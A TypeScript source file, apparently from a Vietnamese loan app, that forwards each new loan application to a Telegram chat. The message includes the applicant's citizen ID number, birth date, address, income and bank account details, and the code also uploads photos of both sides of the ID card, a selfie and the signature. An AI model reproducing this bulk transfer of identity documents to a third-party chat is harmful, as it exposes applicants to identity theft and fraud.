type TelegramPhoto = { caption: string; dataUrl?: string | null };

type TelegramLoanPayload = {
  loan: any;
  profile?: any;
  bank?: any;
  kyc?: any;
  assignedAgent?: any;
  signatureImage?: string | null;
};

export async function notifyNewLoan(payload: TelegramLoanPayload) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_LOAN_CHAT_ID;
  if (!token || !chatId) return;

  const { loan, profile, bank, kyc, assignedAgent, signatureImage } = payload;
  const text = [
    '📌 Hồ sơ vay mới',
    `Mã: ${loan?.id || '-'}`,
    `Khách: ${profile?.name || profile?.fullName || loan?.user?.name || '-'}`,
    `SĐT: ${loan?.user?.phone || '-'}`,
    `CCCD: ${profile?.id || profile?.citizenId || '-'}`,
    `Ngày sinh: ${profile?.birthday || profile?.dateOfBirth || '-'}`,
    `Địa chỉ: ${profile?.address || '-'}`,
    `Nghề nghiệp: ${profile?.job || profile?.jobTitle || '-'}`,
    `Thu nhập: ${profile?.income || profile?.monthlyIncome || '-'}`,
    `Khoản vay: ${formatVnd(loan?.amount)}`,
    `Kỳ hạn: ${loan?.termMonths || '-'} tháng`,
    `Ngân hàng: ${bank?.bank || bank?.bankName || '-'}`,
    `STK: ${bank?.account || bank?.accountNumber || '-'}`,
    `Chủ TK: ${bank?.owner || bank?.accountName || '-'}`,
    `Sale: ${assignedAgent?.name || assignedAgent?.phone || '-'}`,
    `Telegram sale: ${assignedAgent?.telegramLink || '-'}`,
  ].join('\n');

  await telegramSendMessage(token, chatId, text);

  const photos: TelegramPhoto[] = [
    { caption: 'CCCD mặt trước', dataUrl: kyc?.front },
    { caption: 'CCCD mặt sau', dataUrl: kyc?.back },
    { caption: 'Selfie xác minh', dataUrl: kyc?.face },
    { caption: 'Chữ ký hợp đồng', dataUrl: signatureImage },
  ];

  for (const photo of photos) {
    if (photo.dataUrl) await telegramSendPhoto(token, chatId, photo);
  }
}

async function telegramSendMessage(token: string, chatId: string, text: string) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text }),
  }).catch((error) => console.error('telegram sendMessage error', error));
}

async function telegramSendPhoto(token: string, chatId: string, photo: TelegramPhoto) {
  const file = dataUrlToBlob(photo.dataUrl || '');
  if (!file) return;
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', photo.caption);
  form.append('photo', file.blob, file.filename);
  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form }).catch((error) => console.error('telegram sendPhoto error', error));
}

function dataUrlToBlob(dataUrl: string) {
  const match = dataUrl.match(/^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/);
  if (!match) return null;
  const mime = match[1];
  const bytes = Buffer.from(match[2], 'base64');
  if (bytes.length > 9_000_000) return null;
  const ext = mime.split('/')[1] || 'png';
  return { blob: new Blob([bytes], { type: mime }), filename: `loan-image.${ext}` };
}

function formatVnd(value: any) {
  const number = Number(value || 0);
  return `${number.toLocaleString('vi-VN')} đ`;
}
